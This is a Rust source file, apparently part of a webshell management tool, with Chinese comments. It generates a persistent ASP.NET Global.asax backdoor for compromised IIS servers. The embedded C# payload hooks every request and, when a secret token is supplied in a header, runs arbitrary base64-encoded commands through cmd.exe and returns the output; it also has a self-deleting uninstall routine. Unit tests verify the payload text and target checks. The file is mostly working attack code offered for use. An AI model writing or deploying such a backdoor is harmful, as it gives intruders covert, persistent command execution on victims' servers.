//! ASP.NET 持久化形态：`Global.asax`。
//!
//! **这不是内存马**：载荷落在磁盘上，属于「可卸载的持久化形态」。收进内存马面板，
//! 是因为它与 `php_user_ini` 解决同一个问题 —— 请求级常驻（每次请求都经过
//! `Application_BeginRequest`），无需主动命中某个特定文件。
//!
//! 与 PHP 形态的两点关键差异：
//!
//! 1. 文件名**固定**为 `Global.asax`，不能像 `.user.ini` 那样并存多份；
//! 2. 应用可能有自己的 `Global.asax` —— 覆盖它会直接毁掉目标应用，
//!    所以安装前必须确认目标没有该文件（命令层用目录列举判定）。
//!
//! 卸载：载荷收到 `uninstall` 后**删除自身文件**，ASP.NET 检测到文件变化会重启
//! 应用域，代码立即失效（不像 PHP 有 `user_ini.cache_ttl` 的缓存窗口）。
//!
//! **验证状态**：本仓库没有 Windows/IIS 靶场，运行时行为**未经实机验证**；
//! 只对载荷文本与前置条件做了静态测试。首次在真实站点使用前请在测试环境确认。

use dosword_sdk::domain::ProbeResult;

pub const KIND_ASPNET_GLOBAL: &str = "aspx_global";
pub const FILE_NAME: &str = "Global.asax";

/// 应用根目录下的 `Global.asax` 路径。
pub fn asax_path(dir: &str) -> String {
    let trimmed = dir.trim_end_matches(['/', '\\']);
    if trimmed.is_empty() {
        FILE_NAME.to_string()
    } else {
        format!("{trimmed}/{FILE_NAME}")
    }
}

/// 纯本地判定：目标是否为 ASP.NET（IIS）。
pub fn preconditions(info: &ProbeResult) -> Result<(), String> {
    let runtime = info.runtime.to_ascii_lowercase();
    let server = info.web_server.to_ascii_lowercase();
    if runtime.contains("aspx") || runtime.contains("aspnet") || server.contains("asp") {
        return Ok(());
    }
    Err(format!(
        "当前目标 runtime={} / server={}，不是 ASP.NET（IIS）；Global.asax 不会生效",
        if info.runtime.is_empty() {
            "?"
        } else {
            &info.runtime
        },
        if info.web_server.is_empty() {
            "?"
        } else {
            &info.web_server
        },
    ))
}

/// 载荷：在 `Application_BeginRequest` 拦截带操作头的请求。
///
/// 令牌比较用等长逐字节异或累加（不打早退），与 PHP/Java 载荷保持同一姿态；
/// 无正确令牌时直接 `return`，不影响站点正常请求。
pub fn build_payload(token: &str, name: &str) -> String {
    PAYLOAD_TPL
        .replace("__TOKEN__", &csharp_literal(token))
        .replace("__NAME__", &csharp_literal(name))
}

/// 令牌 / 名称都是内部生成的十六进制串，这里仍做最小转义以防万一。
fn csharp_literal(value: &str) -> String {
    value.replace('\\', "\\\\").replace('"', "\\\"")
}

const PAYLOAD_TPL: &str = r#"<%@ Application Language="C#" %>
<script runat="server">
static bool DswEq(string a, string b) {
    if (a == null || b == null || a.Length != b.Length) return false;
    int d = 0;
    for (int i = 0; i < a.Length; i++) d |= a[i] ^ b[i];
    return d == 0;
}
void Application_BeginRequest(object sender, System.EventArgs e) {
    var c = HttpContext.Current;
    var op = c.Request.Headers["X-DSW-OP"];
    if (string.IsNullOrEmpty(op)) return;
    if (!DswEq(c.Request.Headers["X-DSW-TOKEN"], "__TOKEN__")) return;
    c.Response.ContentType = "text/plain";
    try {
        if (op == "ping") {
            c.Response.Write("DSW_MEM:__NAME__:OK");
        } else if (op == "exec") {
            var raw = System.Convert.FromBase64String(c.Request.Headers["X-DSW-CMD"] ?? "");
            var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + System.Text.Encoding.UTF8.GetString(raw));
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            using (var p = System.Diagnostics.Process.Start(psi)) {
                var output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                p.WaitForExit();
                c.Response.Write("DSW_MEM:" + System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(output)));
            }
        } else if (op == "uninstall") {
            // 删除自身：ASP.NET 监视 Global.asax 变化并重启应用域，代码随即失效
            System.IO.File.Delete(c.Server.MapPath("~/Global.asax"));
            c.Response.Write("DSW_MEM:NEUTERED");
        } else {
            c.Response.Write("DSW_MEM:ERR:unknown op");
        }
    } catch (System.Exception ex) {
        c.Response.Write("DSW_MEM:ERR:" + ex.Message);
    }
    c.Response.End();
}
</script>
"#;

#[cfg(test)]
mod tests {
    use super::*;

    fn probe(runtime: &str, server: &str) -> ProbeResult {
        ProbeResult {
            status: String::new(),
            server: String::new(),
            web_server: server.to_string(),
            runtime: runtime.to_string(),
            current_dir: String::new(),
            separator: "\\".to_string(),
            message: String::new(),
            php_sapi: String::new(),
            arch: String::new(),
            extensions: Vec::new(),
            disable_functions: String::new(),
            info: std::collections::HashMap::new(),
            capabilities: None,
        }
    }

    #[test]
    fn asax_path_joins_without_double_separator() {
        assert_eq!(
            asax_path("C:\\inetpub\\wwwroot"),
            "C:\\inetpub\\wwwroot/Global.asax"
        );
        assert_eq!(
            asax_path("C:\\inetpub\\wwwroot\\"),
            "C:\\inetpub\\wwwroot/Global.asax"
        );
        assert_eq!(asax_path("/var/www"), "/var/www/Global.asax");
        assert_eq!(asax_path(""), "Global.asax");
    }

    #[test]
    fn preconditions_only_for_aspnet_targets() {
        assert!(preconditions(&probe("aspx", "IIS/10.0")).is_ok());
        assert!(preconditions(&probe("", "ASP.NET")).is_ok());
        let error = preconditions(&probe("php", "nginx")).unwrap_err();
        assert!(error.contains("不是 ASP.NET"), "{error}");
    }

    /// 载荷必须：内嵌令牌与名称、三种操作齐全、令牌比较不打早退。
    #[test]
    fn payload_embeds_token_and_ops() {
        let payload = build_payload("tok-123", "m1");
        assert!(payload.contains("\"tok-123\""), "令牌应内嵌为 C# 字面量");
        assert!(
            payload.contains("DSW_MEM:m1:OK"),
            "ping 响应格式要与传输层契约一致"
        );
        for op in ["ping", "exec", "uninstall"] {
            assert!(payload.contains(op), "缺少操作 {op}");
        }
        assert!(payload.contains("d |= a[i] ^ b[i]"), "令牌比较不应打早退");
        // 无令牌时立即返回，不影响站点正常请求
        assert!(payload.contains("if (string.IsNullOrEmpty(op)) return;"));
        // 卸载=删除自身（ASP.NET 检测到变化会重启应用域）
        assert!(payload.contains("File.Delete"));
    }

    /// 载荷是**参数化分发器**，不是「传什么代码执行什么」：不允许出现 eval / 动态编译。
    #[test]
    fn payload_has_no_dynamic_code_execution() {
        let payload = build_payload("t", "n");
        for forbidden in [
            "CompileAssemblyFromSource",
            "CSharpCodeProvider",
            "Invoke(",
            "eval",
        ] {
            assert!(!payload.contains(forbidden), "载荷不得包含 {forbidden}");
        }
    }
}
